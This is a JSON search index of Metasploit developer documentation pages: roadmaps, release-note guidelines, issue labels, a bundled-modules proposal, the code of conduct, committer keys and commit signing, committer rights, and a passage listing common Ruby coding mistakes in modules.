{"0": {
    "doc": "2017 Roadmap Review",
    "title": "Metasploit’s 2017 Roadmap Review",
    "content": "In 2017, we published our first open roadmap for Metasploit development. How did we do? For achievements: . | The Metasploit data model backend: we did a lot of design work on this, and got a couple of initial Proof-of-Concept project built. You can see a video of it here: https://www.youtube.com/watch?v=hvuy6A-ie1g. In the mean time, we started merging parts of the main development branch . | The first pass of external session handling landed with the metasploit-proxy project. | Independent modules that run in isolation did land, along with a hand full of new modules demonstrating the advantages of the design, including multi-language support. | The ruby_smb project made a lot of progress, with support incorporated into several existing modules. Full client-side support is also available for testing now. | Native iOS and macOS support landed, along with many new IoT and router exploits. | Meterpreter shrank almost 4x thanks to the new cryptTLV packet obfuscation support, and the removal of OpenSSL. | . Things we didn’t quite finish: . | Metasploit’s RESTful interface was not complete in 2017, so we will continue it into 2018. | Session handling as a separate process was implemented with the https://github.com/rapid7/metasploit-aggregator project, but more work needs to be done to improve scalability and usability. | Asynchronous session support remains on the drawing board. | SOCKS5 support did not land, but Metasploit did gain a lot more support for running modules externally as separate processes, and gained initial support for running modules in Python. | Modernized payload generation with new tools continues to be researched. | . ",
    "url": "/docs/development/roadmap/2017-roadmap-review.html#metasploits-2017-roadmap-review",
    "relUrl": "/docs/development/roadmap/2017-roadmap-review.html#metasploits-2017-roadmap-review"
  },"1": {
    "doc": "2017 Roadmap Review",
    "title": "2017 Roadmap Review",
    "content": " ",
    "url": "/docs/development/roadmap/2017-roadmap-review.html",
    "relUrl": "/docs/development/roadmap/2017-roadmap-review.html"
  },"2": {
    "doc": "2017 Roadmap",
    "title": "Metasploit’s 2017 Roadmap",
    "content": "Starting in 2017, we will provide an open roadmap for setting our goals for the year. The goals are based on many discussions we have had over the past year with users, developers, and customers. The intent is to provide focus for core developers and contributors alike, so that we can together work toward a common vision for how we want Metasploit to evolve. This year, the themes for Metasploit are modularity, reusability, and reliability. Metasploit has grown organically over the years into a very large project, combining thousands of modules, payloads, a database, session handling, user interaction and more into a single monolithic application. While the design has served us well, it has reached some limits for maintainability and agility. While we continue to refactor, improve, and reorganize Metasploit, large-scale improvements become increasingly difficult and highlight fragility in the overall system, due to its highly interdependent design. We want to allow users to effortlessly contribute to the portions of Metasploit they are interested in, and be able to reuse code, both from inside and and outside of the project. Language and licensing constraints have presented barriers to users, both real and imagined. Python, Go, C# and other languages are dominating influences on the infosec community. We would like to be able to welcome more developers, researchers, and tooling into the Metasploit ecosystem, taking advantage of the best-in-breed and avoiding not-invented-here syndrome wherever possible. In short, we want to develop reusable, modular, and reliable services to enable researchers, pen-testers, students, and red-teamers to work efficiently, have access to the latest technologies and techniques, and to continue to grow the Metasploit community. ",
    "url": "/docs/development/roadmap/2017-roadmap.html#metasploits-2017-roadmap",
    "relUrl": "/docs/development/roadmap/2017-roadmap.html#metasploits-2017-roadmap"
  },"3": {
    "doc": "2017 Roadmap",
    "title": "The roadmap",
    "content": ". | The Metasploit data model backend should be separated into its own project. Plans include a data service that provides a RESTful interface, both an event-oriented and classic workspace-oriented view of incoming data, improved performance, and easy direct interoperability with other tools. | Session handling should be able to operate independently of framework, allowing users to share sessions and allowing servers to be as performant, reliable, and light-weight as possible. We have already begun a project called ‘metasploit-aggregator’ which is a first generation of this design. Once this is complete, direct integration into other frameworks should also be possible. | Metasploit should support asynchronous sessions. Many testers today use asynchronous frameworks like Empire to maintain light-weight persistence or a footholds into a network, then have to pivot to Meterpreter for interactive sessions. We would like to be able seamlessly support both modes of operation, including the ability to run post exploitation modules and modules over pivots asynchronously as well. | Metasploit should support running exploit and auxiliary modules in an isolated mode. Plans are underway to support supporting an RPC-style module API to Metasploit framework, providing core services like payload and session handling, network routing, reporting and logging. Modules are run as child processes to Metasploit, and are only loaded into memory as-needed. Networking from a module point-of-view will be handled via SOCKS5 proxy support, hooking the child environment, or remote API calls, largely removing the need for specially-crafted socket objects or changes to 3rd-party protocol libraries. Modules, when written for the Metasploit API, could even be tested and used independently from the full Metasploit framework. | . In addition to these primary goals, we’d also like to explore: . | SMB 2.0 SMB 1.0 increasingly being disabled in many networks, making Metasploit modules using this protocol ineffective. We would like to implement at least server-side support for SMB 2.0, both for sharing files and for named pipe communications. | iOS and macOS support The mettle and python meterpreter payloads will continue evolving to further support OS X and iOS, along with more post exploitation support. | Native Android support in Mettle We began the work last year with mettle now supporting all of the basic operations for a Meterpreter implementation. We would like to continue adding Android post-exploitation capabilities to mettle as well. | Streamlining Windows Meterpreter mettle soon will replace the original POSIX meterpreter, which will reduce the size of the Windows meterpreter. Switching from OpenSSL to native SChannel support will simplify and shrink Windows meterpreter, allowing to focus on what it supports best. | Router and IoT research We would like to continue research and support for embedded device exploitation and first-class support for resource-constrained environments. | Modernizing payload generation We are investigating being able to integrate with third-party toolchains for building assembly, C, .NET, Java, on the fly, making it easy for a user to acquire the and use the tools, while providing first-class support for many architectures and platforms. | . ",
    "url": "/docs/development/roadmap/2017-roadmap.html#the-roadmap",
    "relUrl": "/docs/development/roadmap/2017-roadmap.html#the-roadmap"
  },"4": {
    "doc": "2017 Roadmap",
    "title": "2017 Roadmap",
    "content": " ",
    "url": "/docs/development/roadmap/2017-roadmap.html",
    "relUrl": "/docs/development/roadmap/2017-roadmap.html"
  },"5": {
    "doc": "Release Notes",
    "title": "Writing Release Notes",
    "content": "Okay, so now that you know how to add a release note, you’re wondering what you’re supposed to write. Basically, a release note summarizes the pull request and describes the value of the fix/feature to the user. Each release note has a title, a PR number, and a brief description. Here’s an example of what a release note looks likes: . The Beholder plugin automatically captures keystrokes, screenshots, and webcam snapshots from your active sessions. Run this plugin to collect data from your compromised targets every 30 seconds. ",
    "url": "/docs/development/maintainers/process/adding-release-notes-to-prs.html#writing-release-notes",
    "relUrl": "/docs/development/maintainers/process/adding-release-notes-to-prs.html#writing-release-notes"
  },"6": {
    "doc": "Release Notes",
    "title": "Types of Release Notes",
    "content": "There are three types of release notes: . | Enhancement | Fix | Modules | . Release Notes for Enhancements . An enhancement indicates that an improvement or new feature has been added to the framework. Enhancements include things like auxiliary modules, post-exploitation modules, and new payloads. When you write release notes for an enhancement, you should try to answer the following questions: . | What is the enhancement? | Why is it valuable or important to users? | How can they use it? | . For example, the following is a release note for an enhancement: . The new ‘resolve’ command enables you to perform DNS lookups with Meterpreter, without leaving the session to run additional modules. To resolve host names on the target, you can run the ‘resolve’ command followed by the host name. For example, in the Meterpreter prompt, you can type something like ‘resolve rapid7.com’ to view the host resolutions for Rapid7. Release Notes for Fixes . A fix is for an issue that caused a particular feature or functionality to not work the way it’s expected to work. Basically, a defect indicates that something was broken, and we’ve fixed it. When you write release notes for a fix, you should try to answer the following questions: . | What was broken? | How was it fixed? | Why is this important to users? | . Here’s an example for a fix: . The email header contained duplicate date and subject headers, which caused email servers like AWS SES, to reject the emails. This fix removes the duplicate headers so that campaigns can send emails successfully. Release Notes for Modules . An exploit is a module that takes advantage of a vulnerability and provides some type of access to the target. We call out exploits explicitly because they’re the hotness. When you write release notes for an exploit, you should try to answer the following questions: . | What vulnerability is the module exploiting? | What type of access can you achieve with the module? | Do you need credentials to exploit the vulnerability? | . And finally, here’s an example for exploits: . This module allows you to exploit HP Data Protector, a backup and recovery system, to remotely upload files to the file share. Versions 6.10, 6.10, and 6.20 are vulnerable. You don’t need to authenticate to exploit this vulnerability. ",
    "url": "/docs/development/maintainers/process/adding-release-notes-to-prs.html#types-of-release-notes",
    "relUrl": "/docs/development/maintainers/process/adding-release-notes-to-prs.html#types-of-release-notes"
  },"7": {
    "doc": "Release Notes",
    "title": "Release Notes",
    "content": "Release notes inform our users about the stuff we’re shipping in each release. By looking at our release notes, our users should be able to easily understand what’s new, what’s fixed, and what’s changed in the release. Therefore, all PRs, except for minor fixes and tweaks, must have release notes. To add a release note to a pull request, you’ll need to add it as a comment, like so: . You’ll need to tag the comment for inclusion in the release notes by using the # Release Notes heading. After you apply the release notes heading, you can enter the release notes text you want to use. That’s it! After you add the release notes text, we’ll be able to extract them from the pull requests when we run our release notes script and compile them into a single document. ",
    "url": "/docs/development/maintainers/process/adding-release-notes-to-prs.html",
    "relUrl": "/docs/development/maintainers/process/adding-release-notes-to-prs.html"
  },"8": {
    "doc": "API",
    "title": "API",
    "content": "View the latest API docs at: . https://rapid7.github.io/metasploit-framework/api/ . ",
    "url": "/docs/development/developing-modules/libraries/api.html",
    "relUrl": "/docs/development/developing-modules/libraries/api.html"
  },"9": {
    "doc": "Assigning Labels",
    "title": "Assigning Labels",
    "content": "Maintainers can assign labels to both issues and pull requests. Docs . Documentation changes, such as YARD markup, or README.md, or something along those lines. External . Touches something in /external, or the Gemfile, or something like that. Heartbleed . Has to do with heartbleed. This will go away soon, but there are three outstanding still… . Library . Touches something in /lib. Meterpreter . Has to do with Meterpreter, or depends on a Meterpreter change to land to work. Misc . Plugins and scripts, anything that’s not otherwise defined. Module . Touches something in /modules . Specs . Has specs (an rspec test) . Newbie Friendly . Something that’s pretty easy to test or tackle. attic . When we move something to the attic it means that what you submitted is a thing that we want but the circumstances were not quite right for landing it. Sometimes this is on us, and sometimes the contribution needs more work. We recognize that contributors work on the PRs they submit at their own pace. Take a look at the comments and review suggestions on your PR, and feel free to re-open it if and when you have time to work on it again. Don’t think you’ll be able to get it across the finish line? Find a community champion to do it for you. Needs unique branch . Your submitted a PR from your master branch. Because of how GitHub tracks changes between branches and what got added in a particular PR, we don’t accept contributions from the master branch of your fork. All branches are required to be unique. If your PR is closed because of this, create a new branch with that code and we’ll be happy to look at it again! . git checkout -b &lt;BRANCH_NAME&gt; git push &lt;your_fork_remote&gt; &lt;BRANCH_NAME&gt; . This helps protect the process, ensure users are aware of commits on the branch being considered for merge, allows for a location for more commits to be offered without mingling with other contributor changes and allows contributors to make progress while a PR is still being reviewed. ",
    "url": "/docs/development/maintainers/process/assigning-labels.html",
    "relUrl": "/docs/development/maintainers/process/assigning-labels.html"
  },"10": {
    "doc": "Bundled Modules Proposal",
    "title": "Bundled Modules",
    "content": "Created by Adam Cammack . As Metasploit modules continue to grow in number and capability the current separation of module information by type grows more cumbersome. Starting next year, we want all the files related to a module (docs, libraries, sources, build info, etc.) to live as closely together and be as hackable as possible. To this end, we have come up with the concept of “module bundles” to help improve module dependency isolation and locality of information. We hope the format will prove flexible enough to accommodate the wide range of modules we have and uniform enough to not cause confusion among community members and contributors. Eventually, we may even be able to package each module separately for distribution. Whether or not this bundled format will support the old style of module is uncertain. It could be made to work, I think, but it would require a fair bit of effort and ingenuity to work cleanly. For simplicity, I will describe the bundle concept as it applies to external/coldstone modules and then describe potential adaptations at the end. ",
    "url": "/docs/development/propsals/bundled-modules-proposal.html#bundled-modules",
    "relUrl": "/docs/development/propsals/bundled-modules-proposal.html#bundled-modules"
  },"11": {
    "doc": "Bundled Modules Proposal",
    "title": "Directory structure",
    "content": "Example complicated Ruby module: . $ tree --dirsfirst --charset=ascii -F bundled_module/ bundled_module/ |-- data/ | `-- stack_smash |-- docs/ |-- bundled_module.md |-- poc.py | `-- success.pcap |-- lib/ |-- foo/ | |-- bar.rb | `-- baz.rb | `-- foo.rb |-- src/ | `-- stack_smash.s |-- templates/ | `-- exploit.ps.erb |-- Dockerfile |-- Gemfile |-- Gemfile.lock |-- Rakefile |-- bundled_module.rb* `-- metadata.json . ",
    "url": "/docs/development/propsals/bundled-modules-proposal.html#directory-structure",
    "relUrl": "/docs/development/propsals/bundled-modules-proposal.html#directory-structure"
  },"12": {
    "doc": "Bundled Modules Proposal",
    "title": "Aside: things I’m not sure of and reference vaguely",
    "content": ". | Would the main executable be named after the module (same as the directory, maybe with extension), or given a | standard name? | Would the JSON metadata file be named after the module or given a standard name? | Would we ever allow multiple closely related modules per directory? (eg. routersploit integration, impacts how we think about the above) | If so or not, how would we deal with closely related functionality that has different options for different actions? | Do things like client blobs (HTML, JavaScript, images, etc.) belong in data/ or should we also have a static/? (static/ seems to get a bit fiddly to me; data/static/?) | . ",
    "url": "/docs/development/propsals/bundled-modules-proposal.html#aside-things-im-not-sure-of-and-reference-vaguely",
    "relUrl": "/docs/development/propsals/bundled-modules-proposal.html#aside-things-im-not-sure-of-and-reference-vaguely"
  },"13": {
    "doc": "Bundled Modules Proposal",
    "title": "Required files",
    "content": "To keep overhead to a minimum for hackers who are developing modules, we need to minimize files that the author will need to create, touch, and understand for most tasks (restated: every file an author must touch should be directly related to particular and specialized functionality that they want as part of the preparation or execution of a module). The most minimal module only requires the main executable to be present. When loading modules, framework will see a leaf directory without certain expected files and will generate the default ones automatically. This behaviour can be later augmented with guessing of which defaults based on what is present in the directory. | If Rakefile is absent, framework will generate one that references the shared rake tasks. | If Gemfile is absent and the executable ends in .rb, framework will generate one that depends on the bridge libraries from source. | If metadata.json is absent, framework will generate it using rake. | . All this generation logic should be available as part of a standalone scaffolding tool. ",
    "url": "/docs/development/propsals/bundled-modules-proposal.html#required-files",
    "relUrl": "/docs/development/propsals/bundled-modules-proposal.html#required-files"
  },"14": {
    "doc": "Bundled Modules Proposal",
    "title": "Keeping it all close",
    "content": "One of the drawbacks of the current module system is that all the files related to the development, documentation, and execution of a module live in different places. Some information, like dependencies, is only tracked implicitly or lossily in code or in the top-level specifications of framework. This makes programmatically determining what a module is, targets, or requires fraught with fragile code. Metadata . The metadata will be kept in JSON in a file (or several, see my uncertainties above) that is built by rake. Keeping the metadata cached per-module gives us several capabilities. First, updates look more logical in commits, and the files can be updated as part of the standard PR/landing process. Next, dependency tracking of when the metadata needs to be updated can be offloaded to standard build tool capabilities. Because invoking rake has overhead, any metadata that exists should be considered correct during initial module discovery. Any modules without metadata should then have it generated via rake. Next, every module should have its metadata building task run to (and stale metadata replaced) ensure correctness. If a module is use’d before this process completes, it must have it metadata refreshed via rake if needed as part of the loading process. Since modules are independent, the whole discovery/refreshing process is parallelizable, reducing wall time. In addition to the information we currently cache, we will want to cache any information a user might see or want to know so that, if the cached metadata is more recent than any module files, nothing has to be built or run to use the module. Notably, this includes options and module archetype (which in the future directly map options for user convince, vs the shim approach take today). Build info . All additional build info should be specified as tasks in the module Rakefile. As much a possible, this should also include building with IDE environments, like Visual Studio. Even if the binaries are checked in to reduce runtime requirements (see below), it is still invaluable to know how something was built in the first place. Blobs and sources . Sources are handy, it should be easy to find them! Now they will live in the module in the src/ directory. Here the Rakefile can easily find them and transform them into the beautiful exploitation resources they were meant to be. As much as possible, only sources should be checked into the tree. For super-specific platform targeting things though, that’s not always feasible (eg. VisualStudio projects). It’s times like these that the data/ directory should be used. As mentioned above, the Rakefile should still be able to build the thing given the correct environment. Blobs or assets without a checked-in source also belong in data/, like images or downloaded things. Things for client exploits to download should probably also go in here, like HTML files and static JavaScripts. Templates . Modules that use a large literal interspersed with runtime data should use the templates/ directory to store templates. ERB should be used for printable data by Ruby, and equivalents for other languages (DTL, mustache, etc.). Binary data should maybe be blobs with accompanying offset listings? . Docs . The docs/ directory will contain the files that a user will reference when trying to understand module. This may include PoCs, markdown, pcaps, etc. The HTML we currently show to users would be generated from the module and files here using rake tasks. Additional tooling . One advantage that this directory structure gives us is the ability to write better tooling for it than we have for the current iteration of modules. One downside is that we will need it to in order to make the format accessible to hackers. Shared build tasks . Because all routine module-oriented tasks will be preformed with rake tasks, we will need to make the default actions for these tasks as intelligent and reusable as possible across different module types/implementations. A module author should not have to worry about writing plumbing they do not need (or is common) or messing with plumbing that is only tangentially related to their unique need. To that end, we should have sane defaults for the following at a minimum: . rake run -- Start module, hook up stdin/stdout to JSON-RPC rake metadata -- Generate metadata JSON rake tidy:code -- Run tidiness checks against the code rake tidy:metadata -- Run tidiness checks against the metadata rake doc:text -- Combine all docs into a plain-text, human readable thing rake doc:html -- Similar to today's info -d rake deps -- Install dependencies local to the current user, if possible rake deps:check -- Check to see if a module can likely be run in the current environment rake build -- Build files that need it, defaults: src/FILE.s =&gt; data/FILE (extracted from exe format), ...? rake clean -- Remove generated files rake clobber -- Reset to pristine, checked-out state . Module generation . At the very least, we will also need tooling to create a mostly-empty but runnable module so that an author knows what to poke when writing. This skeleton can be augmented by questions that can help us use different archetypes, like payload vs. remote, or Ruby vs. Python. These commands could also point the author to relevant module writing articles/documentation. For classic modules . The biggest differences for classic modules are metadata generation and running. These can be accomplished with rake tasks, but it would involve starting up a whole framework instance for each module run. For efficiency, we will need to signal to framework to treat the module specially, perhaps having rake deps:check output/return a specific value when the module needs to be run inside of framework. Metadata would then be dumped directly from the framework loader, and instead of rake run, the classic module loader/runner would be run much as it is today. We will probably want to keep the rake tasks for these things for when we don’t already have a framework instance handy. ",
    "url": "/docs/development/propsals/bundled-modules-proposal.html#keeping-it-all-close",
    "relUrl": "/docs/development/propsals/bundled-modules-proposal.html#keeping-it-all-close"
  },"15": {
    "doc": "Bundled Modules Proposal",
    "title": "Bundled Modules Proposal",
    "content": " ",
    "url": "/docs/development/propsals/bundled-modules-proposal.html",
    "relUrl": "/docs/development/propsals/bundled-modules-proposal.html"
  },"16": {
    "doc": "Code Of Conduct",
    "title": "Contributor Code of Conduct",
    "content": "As contributors and maintainers of this project, and in the interest of fostering an open and welcoming community, we pledge to respect all people who contribute through reporting issues, posting feature requests, updating documentation, submitting pull requests or patches, and other activities. We are committed to making participation in this project a harassment-free experience for everyone, regardless of level of experience, gender, gender identity and expression, sexual orientation, disability, personal appearance, body size, race, ethnicity, age, religion, or nationality. Examples of unacceptable behavior by participants include: . | The use of sexualized language or imagery | Personal attacks | Trolling or insulting/derogatory comments | Public or private harassment | Publishing other’s private information, such as physical or electronic addresses, without explicit permission | Other unethical or unprofessional conduct | . Project maintainers have the right and responsibility to remove, edit, or reject comments, commits, code, wiki edits, issues, and other contributions that are not aligned to this Code of Conduct, or to ban temporarily or permanently any contributor for other behaviors that they deem inappropriate, threatening, offensive, or harmful. By adopting this Code of Conduct, project maintainers commit themselves to fairly and consistently applying these principles to every aspect of managing this project. Project maintainers who do not follow or enforce the Code of Conduct may be permanently removed from the project team. This Code of Conduct applies both within project spaces and in public spaces when an individual is representing the project or its community. Instances of abusive, harassing, or otherwise unacceptable behavior may be reported by contacting the project maintainers at msfdev@metasploit.com. If the incident involves a committer, you may report directly to caitlin_condon@rapid7.com or todb@metasploit.com. All complaints will be reviewed and investigated and will result in a response that is deemed necessary and appropriate to the circumstances. Maintainers are obligated to maintain confidentiality with regard to the reporter of an incident. This Code of Conduct is adapted from the Contributor Covenant, version 1.3.0, available at http://contributor-covenant.org/version/1/3/0/ . ",
    "url": "/docs/code-of-conduct.html#contributor-code-of-conduct",
    "relUrl": "/docs/code-of-conduct.html#contributor-code-of-conduct"
  },"17": {
    "doc": "Code Of Conduct",
    "title": "Code Of Conduct",
    "content": " ",
    "url": "/docs/code-of-conduct.html",
    "relUrl": "/docs/code-of-conduct.html"
  },"18": {
    "doc": "Committer Keys",
    "title": "Keybase.io identities",
    "content": "Keybase.io is used by Metasploit as an easy way to verify identities of committers. If you’re a committer on metasploit-framework, and you need an invite, just ask. Altering this table’s layout will almost certainly break import-dev-keys.sh, so please don’t. | Github Username | Keybase.io Username | . | @acammack-r7 | acammackr7 | . | @bcoles | bcoles | . | @busterb | busterb | . | @bwatters-r7 | bwatters | . | @ccondon-r7 | catc0n | . | @cdelafuente-r7 | cdelafuente | . | @chiggins | chiggins | . | @egypt | egypt | . | @FireFart | firefart | . | @Green-m | green-m | . | @gwillcox-r7 | grantwillcox | . | @h00die | h00die | . | @jbarnett-r7 | jmbarnett | . | @jmartin-r7 | jmartinr7 | . | @lsato-r7 | louissato | . | @Meatballs1 | meatballs | . | @mkienow-r7 | inokii | . | @mubix | mubix | . | @OJ | oj | . | @scriptjunkie | scriptjunkie | . | @sgonzalez-r7 | essgee | . | @smashery | smashery | . | @space-r7 | shelbyp | . | @tdoan-r7 | doanosaur | . | @timwr | timwr | . | @todb-r7 | todb | . | @void-in | void_in | . | @wchen-r7 | wchenr7 | . | @zeroSteiner | zerosteiner | . Note, keybase.io does not require your private key to prove your GitHub identity. Actually sharing your private key with Keybase.io is a matter of contention – here’s the usual argument against, and here’s one thoughtful argument for. ",
    "url": "/docs/development/maintainers/committer-keys.html#keybaseio-identities",
    "relUrl": "/docs/development/maintainers/committer-keys.html#keybaseio-identities"
  },"19": {
    "doc": "Committer Keys",
    "title": "Tracking criteria",
    "content": "In order to get @bcook-r7 to track your key, you alert him to its existence through some non-GitHub means, and verify your GitHub username. That’s all there is to it. It would be sociable to track him (and everyone else on this list) back. Tracking is essentially “trusting” and “verifying” – see the much longer discussion here. ",
    "url": "/docs/development/maintainers/committer-keys.html#tracking-criteria",
    "relUrl": "/docs/development/maintainers/committer-keys.html#tracking-criteria"
  },"20": {
    "doc": "Committer Keys",
    "title": "Signing your commits and merges",
    "content": "Contributors are encouraged to sign commits, while Metasploit committers are required to sign their merge commits. Note that the name and e-mail address must match the information on the signing key exactly. To begin: . | Generate a signing key, if you don’t have one already, using your favorite PGP/GPG interface: | . $ gpg --gen-key gpg (GnuPG) 1.4.20; Copyright (C) 2015 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) Your selection? 4 RSA keys may be between 1024 and 4096 bits long. What keysize do you want? (2048) Requested keysize is 2048 bits Please specify how long the key should be valid. 0 = key does not expire &lt;n&gt; = key expires in n days &lt;n&gt;w = key expires in n weeks &lt;n&gt;m = key expires in n months &lt;n&gt;y = key expires in n years Key is valid for? (0) 1y Key expires at Fri 20 Dec 2019 01:38:11 PM CST Is this correct? (y/N) y You need a user ID to identify your key; the software constructs the user ID from the Real Name, Comment and Email Address in this form: \"Heinrich Heine (Der Dichter) &lt;heinrichh@duesseldorf.de&gt;\" Real name: Dade Murphy Email address: dmurphy@thegibson.example Comment: You selected this USER-ID: \"Dade Murphy &lt;dmurphy@thegibson.example&gt;\" Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o You need a Passphrase to protect your secret key. Enter passphrase: [...] . | Modify your .git/config file to enable signing commits and merges by default: | . [user] name = Your Name email = your_email@example.com signingkey = DEADBEEF # Must match name and email exactly! [alias] c = commit -S --edit m = merge -S --no-ff --edit . Using git c and git m from now on will sign every commit with your DEADBEEF key. However, note that rebasing or cherry-picking commits will change the commit hash, and therefore, unsign the commit – to resign the most recent, use git c --amend. ",
    "url": "/docs/development/maintainers/committer-keys.html#signing-your-commits-and-merges",
    "relUrl": "/docs/development/maintainers/committer-keys.html#signing-your-commits-and-merges"
  },"21": {
    "doc": "Committer Keys",
    "title": "Committer Keys",
    "content": "This page lists the keys in use by Metasploit committers and can be used to verify merge commits made to https://github.com/rapid7/metasploit-framework. ",
    "url": "/docs/development/maintainers/committer-keys.html",
    "relUrl": "/docs/development/maintainers/committer-keys.html"
  },"22": {
    "doc": "Committer Rights",
    "title": "Metasploit Committers",
    "content": "The term “Metasploit Committers” describes people who have direct write access to the Rapid7 Metasploit-Framework fork. These are the people who can land changes to this main fork of the Framework. However, it is not necessary to have committer rights in order to contribute to Metasploit. Much of our code comes from non-committers. We encourage anyone to fork the Metasploit project, make changes, fix bugs, and notify the core committers about those changes via Pull Requests. The process for getting started is most comprehensively documented in the Metasploit Development Environment setup guide. Metasploit committers are a mix of Rapid7 employees and outside contributors. Anyone can become a contributor, with the following expectations: . | Committers are empowered to participate in code review, help newbies, and be positive role models in the larger development community. | Committers are likely to take up chores such as writing documentation, evangelization, writing test cases, and code review. | Committers help maintain the character of the Metasploit Framework as a truly independent open source project. | . The Metasploit community is built on the core belief that open contributions and open discussion of security issues has strong benefits for the Internet in general and human society as a whole. By helping each other demonstrate security vulnerabilities and exposures, we foster a community of excellent, ethical practitioners of information security. ",
    "url": "/docs/development/maintainers/committer-rights.html#metasploit-committers",
    "relUrl": "/docs/development/maintainers/committer-rights.html#metasploit-committers"
  },"23": {
    "doc": "Committer Rights",
    "title": "How to be a Committer",
    "content": "Committers tend to review pull requests that come in from other committers and from the wider Metasploit community. Committers generally should not land their own code without some sort of review from another contributor or committer. For most changes, please open a pull request. In addition, always ask for someone to review your work. Even simple fixes might be better done otherwise. If you get no feedback on your pull requests, ask again. Be annoying if necessary! Don’t submit a pull request or make a comment and let it rot because nobody responds. Pull requests should be merged with a git merge -S --no-ff in order to ensure a merge commit is always generated, and your merge commit is signed with your PGP key. Avoid clicking the green “merge” button in Github in order to avoid race conditions with landing code that may sneak past review, and of course, so you can sign your commits. If you reject a pull request, be clear in the pull request why it was rejected, with some effort made to point at helpful resources for next time. Most people don’t often commit to open source code, so when someone does, please be respectful of their efforts. Even if someone else approves of a pull request, and it is shown to be broken later, then it is still your responsibility to correct it. Make every effort to get a fix or revert in as soon as possible, whether you wrote the code, landed it, or approved it. Blame is shared equally. A list of committer public keys is here. ",
    "url": "/docs/development/maintainers/committer-rights.html#how-to-be-a-committer",
    "relUrl": "/docs/development/maintainers/committer-rights.html#how-to-be-a-committer"
  },"24": {
    "doc": "Committer Rights",
    "title": "How to Gain Commit Rights",
    "content": "Commit rights are granted via votes on the committers mailing list. Voting records are archived for the benefit for current and future committers. | Any current committer may nominate any one person as a potential committer by writing to the committers mailing list. | The nominator must provide a justification for committer rights, and include the nominee’s e-mail address. | After some discussion on the mailing list, there will be a group vote on the nominee. | The Metasploit manager (@busterb) will inform the new committer of their new commit rights and responsibilities, add the new committer to the appropriate ACL groups and mailing lists, and inform the mailing list of the successful completion of these tasks. | . Committers introduced in this way will have commit rights to the public framework repositories. ",
    "url": "/docs/development/maintainers/committer-rights.html#how-to-gain-commit-rights",
    "relUrl": "/docs/development/maintainers/committer-rights.html#how-to-gain-commit-rights"
  },"25": {
    "doc": "Committer Rights",
    "title": "How to Lose Commit Rights",
    "content": "Committer rights are not granted strictly on the basis of proven code quality; committer rights are a statement of trust by the existing body of committers, so there are highly subjective criteria in play as well. Elements like an agreeable personality, the ability to remain calm in the face of trolling, the avoidance of criminal proceedings, and other aspects of a committer’s life all play a part in the initial granting of commit access. Breaches of trust in terms of malicious or malformed code, or the demonstration of poor judgement that would reflect poorly on the Metasploit project will lead to a discussion on the committer mailing list, and which is likely result in the removal of committer rights. ",
    "url": "/docs/development/maintainers/committer-rights.html#how-to-lose-commit-rights",
    "relUrl": "/docs/development/maintainers/committer-rights.html#how-to-lose-commit-rights"
  },"26": {
    "doc": "Committer Rights",
    "title": "Useful Links for Committers",
    "content": ". | http://r-7.co/MSF-DEV is pretty much required reading. | So is CONTRIBUTING.md | Check out the Apache Software Foundation’s Guide for Committers. It’s illuminating. | Producing Open Source Software by Ken Fogel is a must-read. | Zach Holman’s Open Source Misfeasance slides – the video is gone! | How to Survive Poisonous People by Ben Collins-Sussman and Brian Fitzpatrick | The Netiquette RFC is about how to be polite. | . ",
    "url": "/docs/development/maintainers/committer-rights.html#useful-links-for-committers",
    "relUrl": "/docs/development/maintainers/committer-rights.html#useful-links-for-committers"
  },"27": {
    "doc": "Committer Rights",
    "title": "Committer Rights",
    "content": " ",
    "url": "/docs/development/maintainers/committer-rights.html",
    "relUrl": "/docs/development/maintainers/committer-rights.html"
  },"28": {
    "doc": "Common Metasploit Module Coding Mistakes",
    "title": "Deprecation notice!",
    "content": "Please see CONTRIBUTING.md for an authoritative coding guide. This document has fallen out of date. We don’t write bad code any more! Hooray! . This is a collection of all the bad code we often see in Metasploit modules. You should avoid them, too. Note: Some of these examples use puts() for demo purposes, but you should always use print_status / print_error when writing a module. Bad Examples You Should NOT Follow: . | Not checking the return value of a Metasploit API | Ruby 1.9.3 vs 1.8.7… gotcha! | Not checking the return value when using match() | Not checking nil before accessing a method | Using exception handling to shut an error up | Not taking advantage of the ‘ensure’ block | Adding the ‘VERBOSE’ option | Neglecting to use ‘vars_post’ for send_request_cgi() when crafting a POST request | Bad variable naming style | Using global variables | Modifying the datastore during execution | . 1. Not checking the return value of a Metasploit API . res = send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; '/app/index.php' }) # There's a bug here, because res can return nil (due to a timeout or other reasons) # If that happens, you will hit a \"undefined method `code' for nil:NilClass\" error. # The correct way should be: if res &amp;&amp; res.code == 200 if res.code == 200 print_status(\"Response looks good\") else print_error(\"Unexpected response\") end . 2. Ruby 1.9.3 vs 1.8.7… gotcha! . some_string = \"ABC\" # This can cause unexpected results to your module. # Better to always do: char = some_string[1, 1] char = some_string[1] if char == 'B' puts \"You will see this message in Ruby 1.9.3\" elsif char == 66 puts \"You will see this message in Ruby 1.8.7\" end . # 1.9 allows a comma after the last argument when calling # a method while 1.8 does not. The most common place to # see this error is in the update_info() section in a # module's constructor. some_method( \"arg1\", \"arg2\", # &lt;-- This comma is a syntax error on 1.8.x ) . 3. Not checking the return value when using match() . str = \"dragon! drag on! Not lizard, I don't do that tongue thing\" # This tries to print \"Not snake\", but it's not in the string, # so you'll get this error: \"undefined method `[]' for nil:NilClass\" puts str.match(/(Not snake)/)[0] . # The above is better written as: if (str =~ /(Not snake)/) puts $1 end . 4. Not checking nil first before accessing a method . str = \"These things are round and tasty, let's call them... tastycles!\" food = str.scan(/donut holes/)[0] # food is nil, and nil has no method called \"empty\". # This will throw an error: \"undefined method `empty?' for nil:NilClass\" if food.empty? or food.nil? puts \"I don't know what it's called\" end . 5. Using exception handling to shut an error up . begin # This block has 2 issues: # Issue #1: sample() is not a method in 1.8.7 # Issue #2: Divided by 0 (race condition) n = [0, 1, 2, 3, 4, 5].sample 1/n rescue # If the user reports a bug saying this code isn't # working, it can be hard to debug exactly what went # wrong for the user without a backtrace. # When you do this, the error also won't be logged in # framework.log, either. # Note that rescuing ::Exception is especially harmful # because it can even hide syntax errors. end . 6. Not taking advantage of the ‘ensure’ block . # You should use the ensure block to make sure x always has a value, # which also avoids repeating code begin n = [0, 1, 2].sample x = 1/n rescue 